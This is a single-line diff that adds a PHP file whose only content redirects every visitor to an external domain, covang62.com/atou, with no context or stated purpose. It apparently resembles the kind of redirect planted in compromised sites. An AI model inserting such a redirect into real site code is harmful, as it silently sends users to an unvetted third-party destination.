@@ -1,0 +1,1 @@
+<?php header("Location: https://covang62.com/atou"); ?>
